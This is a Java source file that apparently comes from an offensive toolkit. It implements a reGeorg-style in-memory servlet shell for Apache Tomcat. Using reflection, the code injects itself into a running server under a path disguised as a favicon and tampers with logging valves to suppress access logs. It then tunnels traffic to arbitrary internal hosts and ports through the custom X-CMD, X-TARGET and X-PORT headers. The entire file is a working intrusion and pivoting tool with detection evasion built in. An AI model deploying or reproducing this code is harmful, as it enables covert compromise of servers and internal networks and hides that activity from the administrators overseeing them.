package com.summersec.x;

import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.ArrayList;
import javax.servlet.Servlet;
import javax.servlet.ServletConfig;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.ServletRegistration.Dynamic;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationContextFacade;
import org.apache.catalina.core.ApplicationServletRegistration;
import org.apache.catalina.core.StandardContext;

public class reGeorgServlet implements Servlet {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String cs = "UTF-8";
    public String path = "/favicondemo.ico";

    public reGeorgServlet() {
    }

    public boolean equals(Object obj) {
        this.parseObj(obj);
        this.path = this.request.getHeader("path");
        StringBuffer output = new StringBuffer();
        String tag_s = "->|";
        String tag_e = "|<-";

        try {
            this.response.setContentType("text/html");
            this.request.setCharacterEncoding(this.cs);
            this.response.setCharacterEncoding(this.cs);
            output.append(this.addServlet());
        } catch (Exception var7) {
            output.append("error:" + var7.toString());
        }

        try {
            this.response.getWriter().print(tag_s + output.toString() + tag_e);
            this.response.getWriter().flush();
            this.response.getWriter().close();
        } catch (Exception var6) {
        }

        return true;
    }

    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[])((Object[])obj);
            this.request = (HttpServletRequest)data[0];
            this.response = (HttpServletResponse)data[1];
        } else {
            try {
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                this.request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest").invoke(obj);
                this.response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception var8) {
                if (obj instanceof HttpServletRequest) {
                    this.request = (HttpServletRequest)obj;

                    try {
                        Field req = this.request.getClass().getDeclaredField("request");
                        req.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest)req.get(this.request);
                        Field resp = request2.getClass().getDeclaredField("response");
                        resp.setAccessible(true);
                        this.response = (HttpServletResponse)resp.get(request2);
                    } catch (Exception var7) {
                        try {
                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                        } catch (Exception var6) {
                        }
                    }
                }
            }
        }

    }

    public String addServlet() throws Exception {
        try {
            ServletContext servletContext = this.request.getServletContext();
            ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade)servletContext;
            Field applicationContextField = applicationContextFacade.getClass().getDeclaredField("context");
            applicationContextField.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext)applicationContextField.get(applicationContextFacade);
            Field standardContextField = applicationContext.getClass().getDeclaredField("context");
            standardContextField.setAccessible(true);
            StandardContext standardContext = (StandardContext)standardContextField.get(applicationContext);
            Wrapper wrapper = standardContext.createWrapper();
            wrapper.setName(this.path);
            standardContext.addChild(wrapper);
            wrapper.setServletClass(this.path);
            wrapper.setServlet(this);
            Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);
            registration.addMapping(new String[]{this.path});
            registration.setLoadOnStartup(1);
            if (this.getMethodByClass(wrapper.getClass(), "setServlet", Servlet.class) == null) {
                this.transform(standardContext, this.path);
                this.init((ServletConfig)getFieldValue(wrapper, "facade"));
            }

            return "Success";
        } catch (Exception var9) {
            return var9.getMessage();
        }
    }

    public void service(ServletRequest req, ServletResponse resp) throws ServletException, IOException {
        HttpServletRequest request = (HttpServletRequest)req;
        HttpServletResponse response = (HttpServletResponse)resp;
        HttpSession session = request.getSession();

        try {
            this.noLog(request);
        } catch (Exception var14) {
        }

        try {
            String cmd = request.getHeader("X-CMD");
            if (cmd != null) {
                response.setHeader("X-STATUS", "OK");
                int readlen;
                if (cmd.compareTo("CONNECT") == 0) {
                    try {
                        String target = request.getHeader("X-TARGET");
                        readlen = Integer.parseInt(request.getHeader("X-PORT"));
                        SocketChannel socketChannel = SocketChannel.open();
                        socketChannel.connect(new InetSocketAddress(target, readlen));
                        socketChannel.configureBlocking(false);
                        session.setAttribute("socket", socketChannel);
                        response.setHeader("X-STATUS", "OK");
                    } catch (UnknownHostException var12) {
                        System.out.println(var12.getMessage());
                        response.setHeader("X-ERROR", var12.getMessage());
                        response.setHeader("X-STATUS", "FAIL");
                    } catch (IOException var13) {
                        System.out.println(var13.getMessage());
                        response.setHeader("X-ERROR", var13.getMessage());
                        response.setHeader("X-STATUS", "FAIL");
                    }
                } else {
                    SocketChannel socketChannel;
                    if (cmd.compareTo("DISCONNECT") == 0) {
                        socketChannel = (SocketChannel)session.getAttribute("socket");

                        try {
                            socketChannel.socket().close();
                        } catch (Exception var11) {
                            System.out.println(var11.getMessage());
                        }

                        session.invalidate();
                    } else if (cmd.compareTo("READ") == 0) {
                        socketChannel = (SocketChannel)session.getAttribute("socket");

                        try {
                            ByteBuffer buf = ByteBuffer.allocate(512);
                            int bytesRead = socketChannel.read(buf);

                            ServletOutputStream so;
                            for(so = response.getOutputStream(); bytesRead > 0; bytesRead = socketChannel.read(buf)) {
                                so.write(buf.array(), 0, bytesRead);
                                so.flush();
                                buf.clear();
                            }

                            response.setHeader("X-STATUS", "OK");
                            so.flush();
                            so.close();
                        } catch (Exception var16) {
                            System.out.println(var16.getMessage());
                            response.setHeader("X-ERROR", var16.getMessage());
                            response.setHeader("X-STATUS", "FAIL");
                        }
                    } else if (cmd.compareTo("FORWARD") == 0) {
                        socketChannel = (SocketChannel)session.getAttribute("socket");

                        try {
                            readlen = request.getContentLength();
                            byte[] buff = new byte[readlen];
                            request.getInputStream().read(buff, 0, readlen);
                            ByteBuffer buf = ByteBuffer.allocate(readlen);
                            buf.clear();
                            buf.put(buff);
                            buf.flip();

                            while(buf.hasRemaining()) {
                                socketChannel.write(buf);
                            }

                            response.setHeader("X-STATUS", "OK");
                        } catch (Exception var15) {
                            System.out.println(var15.getMessage());
                            response.setHeader("X-ERROR", var15.getMessage());
                            response.setHeader("X-STATUS", "FAIL");
                            socketChannel.socket().close();
                        }
                    }
                }
            } else {
                response.getWriter().write("Georg says, 'All seems fine'");
                response.getWriter().flush();
                response.getWriter().close();
            }

        } catch (ClassCastException var17) {
            throw new ServletException("non-HTTP request or response");
        }
    }

    private void transform(Object standardContext, String path) throws Exception {
        Object containerBase = this.invoke(standardContext, "getParent", (Object[])null);
        Class mapperListenerClass = Class.forName("org.apache.catalina.connector.MapperListener", false, containerBase.getClass().getClassLoader());
        Field listenersField = Class.forName("org.apache.catalina.core.ContainerBase", false, containerBase.getClass().getClassLoader()).getDeclaredField("listeners");
        listenersField.setAccessible(true);
        ArrayList listeners = (ArrayList)listenersField.get(containerBase);

        for(int i = 0; i < listeners.size(); ++i) {
            Object mapperListener_Mapper = listeners.get(i);
            if (mapperListener_Mapper != null && mapperListenerClass.isAssignableFrom(mapperListener_Mapper.getClass())) {
                Object mapperListener_Mapper2 = getFieldValue(mapperListener_Mapper, "mapper");
                Object mapperListener_Mapper_hosts = getFieldValue(mapperListener_Mapper2, "hosts");

                for(int j = 0; j < Array.getLength(mapperListener_Mapper_hosts); ++j) {
                    Object mapperListener_Mapper_host = Array.get(mapperListener_Mapper_hosts, j);
                    Object mapperListener_Mapper_hosts_contextList = getFieldValue(mapperListener_Mapper_host, "contextList");
                    Object mapperListener_Mapper_hosts_contextList_contexts = getFieldValue(mapperListener_Mapper_hosts_contextList, "contexts");

                    for(int k = 0; k < Array.getLength(mapperListener_Mapper_hosts_contextList_contexts); ++k) {
                        Object mapperListener_Mapper_hosts_contextList_context = Array.get(mapperListener_Mapper_hosts_contextList_contexts, k);
                        if (standardContext.equals(getFieldValue(mapperListener_Mapper_hosts_contextList_context, "object"))) {
                            new ArrayList();
                            Object standardContext_Mapper = this.invoke(standardContext, "getMapper", (Object[])null);
                            Object standardContext_Mapper_Context = getFieldValue(standardContext_Mapper, "context");
                            Object standardContext_Mapper_Context_exactWrappers = getFieldValue(standardContext_Mapper_Context, "exactWrappers");
                            Object mapperListener_Mapper_hosts_contextList_context_exactWrappers = getFieldValue(mapperListener_Mapper_hosts_contextList_context, "exactWrappers");

                            int l;
                            Object Mapper_Wrapper;
                            Method addWrapperMethod;
                            for(l = 0; l < Array.getLength(mapperListener_Mapper_hosts_contextList_context_exactWrappers); ++l) {
                                Mapper_Wrapper = Array.get(mapperListener_Mapper_hosts_contextList_context_exactWrappers, l);
                                if (path.equals(getFieldValue(Mapper_Wrapper, "name"))) {
                                    addWrapperMethod = mapperListener_Mapper2.getClass().getDeclaredMethod("removeWrapper", mapperListener_Mapper_hosts_contextList_context.getClass(), String.class);
                                    addWrapperMethod.setAccessible(true);
                                    addWrapperMethod.invoke(mapperListener_Mapper2, mapperListener_Mapper_hosts_contextList_context, path);
                                }
                            }

                            for(l = 0; l < Array.getLength(standardContext_Mapper_Context_exactWrappers); ++l) {
                                Mapper_Wrapper = Array.get(standardContext_Mapper_Context_exactWrappers, l);
                                if (path.equals(getFieldValue(Mapper_Wrapper, "name"))) {
                                    addWrapperMethod = mapperListener_Mapper2.getClass().getDeclaredMethod("addWrapper", mapperListener_Mapper_hosts_contextList_context.getClass(), String.class, Object.class);
                                    addWrapperMethod.setAccessible(true);
                                    addWrapperMethod.invoke(mapperListener_Mapper2, mapperListener_Mapper_hosts_contextList_context, path, getFieldValue(Mapper_Wrapper, "object"));
                                }
                            }
                        }
                    }
                }
            }
        }

    }

    private void noLog(HttpServletRequest request) throws Exception {
        Object servletContext = getFieldValue(request.getServletContext(), "context");
        Object standardContext = getFieldValue(servletContext, "context");

        try {
            ArrayList arrayList;
            for(arrayList = new ArrayList(); standardContext != null; standardContext = this.invoke(standardContext, "getParent", (Object[])null)) {
                arrayList.add(standardContext);
            }

            label49:
            for(int i = 0; i < arrayList.size(); ++i) {
                Object pipeline = this.invoke(arrayList.get(i), "getPipeline", (Object[])null);
                if (pipeline != null) {
                    Object valve = this.invoke(pipeline, "getFirst", (Object[])null);

                    while(true) {
                        while(true) {
                            if (valve == null) {
                                continue label49;
                            }

                            if (this.getMethodByClass(valve.getClass(), "getCondition", (Class[])null) != null && this.getMethodByClass(valve.getClass(), "setCondition", String.class) != null) {
                                String condition = (String)this.invoke(valve, "getCondition");
                                condition = condition == null ? "FuckLog" : condition;
                                this.invoke(valve, "setCondition", condition);
                                this.request.setAttribute(condition, condition);
                                valve = this.invoke(valve, "getNext", (Object[])null);
                            } else if (Class.forName("org.apache.catalina.Valve", false, standardContext.getClass().getClassLoader()).isAssignableFrom(valve.getClass())) {
                                valve = this.invoke(valve, "getNext", (Object[])null);
                            } else {
                                valve = null;
                            }
                        }
                    }
                }
            }
        } catch (Exception var9) {
        }

    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field)obj;
        } else {
            f = obj.getClass().getDeclaredField(fieldName);
        }

        f.setAccessible(true);
        f.set(obj, value);
    }

    private Object invoke(Object obj, String methodName, Object... parameters) {
        try {
            ArrayList classes = new ArrayList();
            if (parameters != null) {
                for(int i = 0; i < parameters.length; ++i) {
                    Object o1 = parameters[i];
                    if (o1 != null) {
                        classes.add(o1.getClass());
                    } else {
                        classes.add((Object)null);
                    }
                }
            }

            Method method = this.getMethodByClass(obj.getClass(), methodName, (Class[])((Class[])classes.toArray(new Class[0])));
            return method.invoke(obj, parameters);
        } catch (Exception var7) {
            return null;
        }
    }

    private Method getMethodByClass(Class cs, String methodName, Class... parameters) {
        Method method = null;

        while(cs != null) {
            try {
                method = cs.getDeclaredMethod(methodName, parameters);
                cs = null;
            } catch (Exception var6) {
                cs = cs.getSuperclass();
            }
        }

        return method;
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field)obj;
        } else {
            Method method = null;
            Class cs = obj.getClass();

            while(cs != null) {
                try {
                    f = cs.getDeclaredField(fieldName);
                    cs = null;
                } catch (Exception var6) {
                    cs = cs.getSuperclass();
                }
            }
        }

        f.setAccessible(true);
        return f.get(obj);
    }

    public void init(ServletConfig servletConfig) throws ServletException {
    }

    public ServletConfig getServletConfig() {
        return null;
    }

    public String getServletInfo() {
        return null;
    }

    public void destroy() {
    }
}
